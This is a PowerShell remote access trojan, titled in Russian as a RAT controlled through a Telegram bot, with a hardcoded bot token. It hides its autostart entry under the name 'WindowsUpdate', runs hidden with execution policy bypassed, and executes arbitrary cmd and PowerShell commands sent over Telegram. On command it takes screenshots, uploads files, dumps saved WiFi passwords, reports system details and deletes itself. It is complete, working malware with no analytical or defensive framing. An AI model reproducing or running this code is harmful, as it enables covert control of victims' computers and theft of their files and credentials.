# RAT через Telegram Bot
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"
$CurrentDirectory = Get-Location

function Send-TelegramMessage {
    param([string]$Message, [string]$FilePath = $null)
    
    $uri = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{
        chat_id = $ChatID
        text = $Message
        parse_mode = "HTML"
    }
    
    if ($FilePath) {
        $uri = "https://api.telegram.org/bot$Token/sendDocument"
        $file = Get-Item $FilePath
        $form = @{
            chat_id = $ChatID
            document = Get-Item $FilePath
            caption = $Message
        }
        Invoke-RestMethod -Uri $uri -Method Post -Form $form
    } else {
        Invoke-RestMethod -Uri $uri -Method Post -Body $body
    }
}

function Take-Screenshot {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
    $screenshotPath = "$env:TEMP\screenshot.png"
    $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    $bitmap.Dispose()
    return $screenshotPath
}

function Get-SystemInfo {
    $computerInfo = Get-ComputerInfo
    $os = "$($computerInfo.WindowsProductName) $($computerInfo.WindowsVersion)"
    $cpu = (Get-WmiObject Win32_Processor).Name
    $ram = "{0}GB" -f [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2)
    $users = (Get-WmiObject Win32_ComputerSystem).UserName
    $uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
    
    return @"
System Information:
OS: $os
CPU: $cpu
RAM: $ram
Current User: $users
Uptime: $($uptime.Days)d $($uptime.Hours)h $($uptime.Minutes)m
"@
}

function Get-WifiPasswords {
    $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.Line.Split(":")[1].Trim() }
    $results = @()
    
    foreach ($profile in $profiles) {
        $password = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content" | ForEach-Object { $_.Line.Split(":")[1].Trim() }
        if ($password) {
            $results += "SSID: $profile | Password: $password"
        }
    }
    
    return $results -join "`n"
}

function SelfDestruct {
    Remove-Item -Path $MyInvocation.MyCommand.Path -Force
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -ErrorAction SilentlyContinue
    exit
}

# Добавление в автозагрузку
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "WindowsUpdate"
$regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -ErrorAction SilentlyContinue

# Основной цикл
while ($true) {
    try {
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates" -Method Get
        if ($updates.ok -and $updates.result.Count -gt 0) {
            $latestUpdate = $updates.result[-1]
            $messageText = $latestUpdate.message.text
            $updateID = $latestUpdate.update_id
            
            if ($updateID -gt $script:lastUpdateID) {
                $script:lastUpdateID = $updateID
                
                switch -regex ($messageText) {
                    "^/screenshot" {
                        $screenshotPath = Take-Screenshot
                        Send-TelegramMessage -Message "Screenshot captured" -FilePath $screenshotPath
                        Remove-Item $screenshotPath -Force
                    }
                    "^/cmd (.+)" {
                        $command = $matches[1]
                        $output = cmd /c $command 2>&1 | Out-String
                        Send-TelegramMessage -Message "CMD Output:`n$output"
                    }
                    "^/ps (.+)" {
                        $command = $matches[1]
                        $output = Invoke-Expression $command 2>&1 | Out-String
                        Send-TelegramMessage -Message "PowerShell Output:`n$output"
                    }
                    "^/cd (.+)" {
                        $path = $matches[1]
                        Set-Location $path
                        $CurrentDirectory = Get-Location
                        Send-TelegramMessage -Message "Changed directory to: $CurrentDirectory"
                    }
                    "^/pwd" {
                        Send-TelegramMessage -Message "Current directory: $CurrentDirectory"
                    }
                    "^/download (.+)" {
                        $filePath = $matches[1]
                        if (Test-Path $filePath) {
                            Send-TelegramMessage -Message "Sending file: $filePath" -FilePath $filePath
                        } else {
                            Send-TelegramMessage -Message "File not found: $filePath"
                        }
                    }
                    "^/sysinfo" {
                        $sysInfo = Get-SystemInfo
                        Send-TelegramMessage -Message $sysInfo
                    }
                    "^/wifipass" {
                        $wifiInfo = Get-WifiPasswords
                        Send-TelegramMessage -Message "WiFi Passwords:`n$wifiInfo"
                    }
                    "^/selfdestruct" {
                        Send-TelegramMessage -Message "Self destruction initiated"
                        SelfDestruct
                    }
                }
            }
        }
    } catch {
        # Продолжать работу при ошибках
    }
    Start-Sleep -Seconds 2
}
